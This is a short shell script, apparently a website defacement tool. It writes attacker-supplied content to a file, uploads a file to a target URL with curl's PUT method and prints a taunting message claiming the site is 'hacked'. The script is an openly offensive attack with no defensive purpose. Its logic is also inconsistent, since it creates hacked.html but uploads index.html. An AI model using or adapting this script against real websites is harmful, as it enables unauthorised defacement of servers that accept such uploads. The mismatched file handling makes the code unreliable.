echo $2 > hacked.html
curl -T index.html $1
echo "_Maybe website already hacked.. check at ur browser! 🫠_\nAccess: "$1"/hacked.html"
rm hacked.html
